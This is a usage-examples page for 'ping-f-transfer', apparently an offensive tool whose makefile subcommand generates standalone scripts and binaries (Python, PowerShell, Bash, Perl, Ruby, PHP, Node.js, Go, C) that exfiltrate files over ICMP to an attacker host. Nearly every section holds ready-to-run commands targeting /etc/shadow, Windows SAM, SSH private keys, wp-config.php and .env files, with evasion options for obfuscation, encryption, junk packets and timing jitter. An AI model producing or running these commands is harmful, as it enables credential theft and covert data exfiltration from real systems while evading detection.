# `makefile` — Examples

The `makefile` subcommand generates a **standalone script file** that can be transferred to the target machine and executed directly. Supports all 8 scripting languages plus Go and C (compiled).

> **Reminder:** Start `tshark` on the **receiver** before executing the generated script on the sender.
>
> ```bash
> sudo tshark -i <interface> -l -Y 'icmp.type==8 && ip.src==<sender-ip>' -T fields -e data.data > capture.hex
> ```

> **Tip:** Always use **absolute paths** with `-f` and quote them. The path is embedded in the generated file.

## Table of Contents

- [Python](#python)
- [PowerShell](#powershell)
- [Bash](#bash)
- [Perl](#perl)
- [Ruby](#ruby)
- [PHP](#php)
- [Node.js](#nodejs)
- [Go](#go)
- [C](#c)
- [All flags combined](#all-flags-combined)

---

## Python

```bash
# Basic — generates generated_ping_f_transfer.py
ping-f-transfer makefile -f '/tmp/secret.txt' -i 10.10.14.5 -l python

# Custom output path
ping-f-transfer makefile -f '/tmp/secret.txt' -i 10.10.14.5 -l python -o /tmp/send.py

# With variable randomization + string obfuscation
ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l python --randomize-var --obfuscate-strings

# With encryption + compression
ping-f-transfer makefile -f '/home/user/data.db' -i 10.10.14.5 -l python \
  --compress --encrypt --enc-passphrase 'p@ss' --obfuscate-strings

# With junk packets
ping-f-transfer makefile -f '/tmp/loot.zip' -i 10.10.14.5 -l python --junk 3 --randomize-junk
```

**Run on target:**

```bash
python3 generated_ping_f_transfer.py
```

---

## PowerShell

```bash
# Basic — generates generated_ping_f_transfer.ps1
ping-f-transfer makefile -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell

# Custom output path
ping-f-transfer makefile -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell -o /tmp/send.ps1

# With variable randomization + string obfuscation
ping-f-transfer makefile -f 'C:\Users\admin\SAM' -i 10.10.14.5 -l powershell --randomize-var --obfuscate-strings

# With encryption
ping-f-transfer makefile -f 'C:\Windows\System32\config\SAM' -i 10.10.14.5 -l powershell \
  --encrypt --enc-passphrase 's3cret' --obfuscate-strings

# With compression + junk
ping-f-transfer makefile -f 'C:\inetpub\logs\LogFiles\access.log' -i 10.10.14.5 -l powershell \
  --compress --junk 2
```

**Run on target:**

```powershell
pwsh generated_ping_f_transfer.ps1
```

---

## Bash

```bash
# Basic — generates generated_ping_f_transfer.sh (executable)
ping-f-transfer makefile -f '/etc/passwd' -i 10.10.14.5 -l bash

# Custom output path
ping-f-transfer makefile -f '/etc/passwd' -i 10.10.14.5 -l bash -o /tmp/send.sh

# Full stealth: all flags
ping-f-transfer makefile -f '/root/.ssh/id_rsa' -i 10.10.14.5 -l bash \
  --compress --encrypt --random-passphrase 20 \
  --junk 4 --randomize-junk \
  --randomize-var --obfuscate-strings

# With delay
ping-f-transfer makefile -f '/var/log/auth.log' -i 10.10.14.5 -l bash -p 0.5 -r 0.2
```

**Run on target:**

```bash
bash generated_ping_f_transfer.sh
# or, since it has a shebang and is executable:
./generated_ping_f_transfer.sh
```

---

## Perl

```bash
# Basic — generates generated_ping_f_transfer.pl (executable)
ping-f-transfer makefile -f '/etc/passwd' -i 10.10.14.5 -l perl

# With string obfuscation + variable randomization
ping-f-transfer makefile -f '/opt/data/config.yaml' -i 10.10.14.5 -l perl \
  --obfuscate-strings --randomize-var

# With encryption
ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l perl \
  --encrypt --enc-passphrase 'p3rl_p@ss' --obfuscate-strings

# With compression + junk
ping-f-transfer makefile -f '/var/log/syslog' -i 10.10.14.5 -l perl --compress --junk 3
```

**Run on target:**

```bash
perl generated_ping_f_transfer.pl
```

---

## Ruby

```bash
# Basic — generates generated_ping_f_transfer.rb (executable)
ping-f-transfer makefile -f '/etc/passwd' -i 10.10.14.5 -l ruby

# With string obfuscation + encryption
ping-f-transfer makefile -f '/home/user/credentials.txt' -i 10.10.14.5 -l ruby \
  --encrypt --enc-passphrase 'ruby_s3cret' --obfuscate-strings --randomize-var

# With compression
ping-f-transfer makefile -f '/tmp/backup.tar.gz' -i 10.10.14.5 -l ruby --compress

# With junk + randomized junk
ping-f-transfer makefile -f '/opt/app/database.sqlite' -i 10.10.14.5 -l ruby --junk 5 --randomize-junk
```

**Run on target:**

```bash
ruby generated_ping_f_transfer.rb
```

---

## PHP

```bash
# Basic — generates generated_ping_f_transfer.php
ping-f-transfer makefile -f '/var/www/html/wp-config.php' -i 10.10.14.5 -l php

# With string obfuscation
ping-f-transfer makefile -f '/var/www/html/.env' -i 10.10.14.5 -l php --obfuscate-strings

# With encryption + compression + variable randomization
ping-f-transfer makefile -f '/var/log/apache2/access.log' -i 10.10.14.5 -l php \
  --compress --encrypt --enc-passphrase 'php_p@ss' --randomize-var --obfuscate-strings

# With junk
ping-f-transfer makefile -f '/tmp/dump.sql' -i 10.10.14.5 -l php --junk 2
```

**Run on target:**

```bash
php generated_ping_f_transfer.php
```

---

## Node.js

Accepts both `-l node` and `-l javascript`.

```bash
# Basic — generates generated_ping_f_transfer.js (executable)
ping-f-transfer makefile -f '/etc/passwd' -i 10.10.14.5 -l node

# With string obfuscation + variable randomization
ping-f-transfer makefile -f '/opt/app/config.json' -i 10.10.14.5 -l node \
  --obfuscate-strings --randomize-var

# With encryption + compression
ping-f-transfer makefile -f '/var/lib/mysql/data.myd' -i 10.10.14.5 -l node \
  --compress --encrypt --enc-passphrase 'n0de_p@ss' --obfuscate-strings

# With junk + randomized junk
ping-f-transfer makefile -f '/tmp/secrets.json' -i 10.10.14.5 -l node --junk 4 --randomize-junk
```

**Run on target:**

```bash
node generated_ping_f_transfer.js
```

---

## Go

Go is only available with `makefile`. It generates `.go` source code that must be compiled. Requires `--create-script-for` to specify the target OS.

### Installing Go

<details>
<summary>Via package manager</summary>

```bash
# Debian / Ubuntu / Kali
sudo apt install golang

# Arch
sudo pacman -S go

# macOS
brew install go
```

</details>

<details>
<summary>Manual installation (from the official Go page)</summary>

Download the latest version from [https://go.dev/dl/](https://go.dev/dl/) and install:

```bash
# Download (replace version as needed)
wget https://go.dev/dl/go1.24.3.linux-amd64.tar.gz

# Remove any previous installation and extract
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.3.linux-amd64.tar.gz

# Add to PATH (add this line to ~/.bashrc or ~/.zshrc to make it permanent)
export PATH=$PATH:/usr/local/go/bin

# Verify
go version
```

See [https://go.dev/doc/install](https://go.dev/doc/install) for full instructions.

</details>

### Examples

```bash
# For Linux
ping-f-transfer makefile -f '/tmp/loot.tar.gz' -i 10.10.14.5 -l go --create-script-for linux

# For macOS
ping-f-transfer makefile -f '/tmp/loot.tar.gz' -i 10.10.14.5 -l go --create-script-for macos

# For Windows
ping-f-transfer makefile -f 'C:\Users\admin\data.zip' -i 10.10.14.5 -l go --create-script-for windows

# With encryption + string obfuscation
ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l go --create-script-for linux \
  --encrypt --enc-passphrase 'g0_s3cret' --obfuscate-strings

# With compression + junk
ping-f-transfer makefile -f '/var/log/syslog' -i 10.10.14.5 -l go --create-script-for linux \
  --compress --junk 3

# With variable randomization
ping-f-transfer makefile -f '/tmp/data.bin' -i 10.10.14.5 -l go --create-script-for linux --randomize-var

# Custom output path
ping-f-transfer makefile -f '/tmp/data.bin' -i 10.10.14.5 -l go --create-script-for linux -o /tmp/sender.go
```

**Build and run (the tool prints these steps):**

```bash
# Linux target
cd /tmp
go mod init ping-f-transfer
go build -o sender sender.go
# Transfer the binary to the target, then:
chmod +x ./sender && ./sender

# Windows cross-compile (from Linux)
GOOS=windows GOARCH=amd64 go build -o sender.exe sender.go
```

Go produces statically linked binaries by default.

---

## C

C is only available with `makefile`. It generates `.c` source code with self-contained AES-CBC, SHA-256, and PBKDF2 implementations (no external crypto libraries needed). Requires `--create-script-for` to specify the target OS.

### Installing a C compiler

| Target OS | What you need | Install command (Debian/Ubuntu/Kali) |
|---|---|---|
| Linux | `gcc` | `sudo apt install gcc` (usually pre-installed) |
| macOS | Xcode Command Line Tools | `xcode-select --install` (on macOS itself) |
| Windows (cross-compile from Linux) | `gcc-mingw-w64-x86-64` | `sudo apt install gcc-mingw-w64-x86-64` |

```bash
# Install everything at once on Debian / Ubuntu / Kali
sudo apt install gcc gcc-mingw-w64-x86-64
```

If using `--compress`, you also need the zlib development headers:

| Target OS | Package | Install command |
|---|---|---|
| Linux | `zlib1g-dev` | `sudo apt install zlib1g-dev` (usually pre-installed) |
| Windows (cross-compile) | `libz-mingw-w64-dev` | `sudo apt install libz-mingw-w64-dev` |

### Examples

```bash
# For Linux (built with -static for portability)
ping-f-transfer makefile -f '/tmp/loot.tar.gz' -i 10.10.14.5 -l c --create-script-for linux

# For macOS
ping-f-transfer makefile -f '/tmp/loot.tar.gz' -i 10.10.14.5 -l c --create-script-for macos

# For Windows (cross-compiled with mingw)
ping-f-transfer makefile -f 'C:\Users\admin\data.zip' -i 10.10.14.5 -l c --create-script-for windows

# With encryption + string obfuscation
ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l c --create-script-for linux \
  --encrypt --enc-passphrase 'c_s3cret' --obfuscate-strings

# With compression (requires zlib)
ping-f-transfer makefile -f '/var/log/syslog' -i 10.10.14.5 -l c --create-script-for linux --compress

# With junk + randomized junk
ping-f-transfer makefile -f '/tmp/data.bin' -i 10.10.14.5 -l c --create-script-for linux \
  --junk 5 --randomize-junk

# With variable randomization
ping-f-transfer makefile -f '/tmp/data.bin' -i 10.10.14.5 -l c --create-script-for linux --randomize-var

# Custom output path
ping-f-transfer makefile -f '/tmp/data.bin' -i 10.10.14.5 -l c --create-script-for linux -o /tmp/sender.c
```

**Build and run (the tool prints these steps):**

```bash
# Linux (static binary — runs on any machine)
gcc -o sender sender.c -static -lm
chmod +x ./sender && ./sender

# macOS (no -static, Apple doesn't support it)
gcc -o sender sender.c -lm
chmod +x ./sender && ./sender

# Windows cross-compile (from Linux, requires gcc-mingw-w64-x86-64)
x86_64-w64-mingw32-gcc -o sender.exe sender.c -static -lws2_32 -liphlpapi -lm
```

If using `--compress`, add `-lz` to the build command:

```bash
# Linux with compression
gcc -o sender sender.c -static -lm -lz

# Windows with compression (requires libz-mingw-w64-dev)
x86_64-w64-mingw32-gcc -o sender.exe sender.c -static -lws2_32 -liphlpapi -lm -lz
```

---

## All flags combined

Using every available flag in a single `makefile` command (C for Windows as an example):

```bash
ping-f-transfer makefile -f 'C:\Users\admin\Desktop\confidential.docx' -i 10.10.14.5 -l c \
  --create-script-for windows \
  -p 0.01 -r 0.003 \
  --junk 2 --randomize-junk \
  --compress \
  --encrypt aes-128 --random-passphrase 32 \
  --randomize-var --obfuscate-strings \
  -o /tmp/sender.c \
  --capture-packets-filename capture_all.hex \
  --decoded-filename recovered.docx \
  --no-banner
```

The same pattern works with any language. Here it is with Go for Linux:

```bash
ping-f-transfer makefile -f '/home/user/confidential.pdf' -i 10.10.14.5 -l go \
  --create-script-for linux \
  -p 0.01 -r 0.003 \
  --junk 2 --randomize-junk \
  --compress \
  --encrypt aes-128 --random-passphrase 32 \
  --randomize-var --obfuscate-strings \
  -o /tmp/sender.go \
  --capture-packets-filename capture_all.hex \
  --decoded-filename recovered.pdf \
  --no-banner
```

And with a scripting language (Bash):

```bash
ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l bash \
  -p 0.01 -r 0.003 \
  --junk 2 --randomize-junk \
  --compress \
  --encrypt aes-128 --random-passphrase 32 \
  --randomize-var --obfuscate-strings \
  -o /tmp/sender.sh \
  --capture-packets-filename capture_all.hex \
  --decoded-filename recovered_shadow.txt \
  --no-banner
```
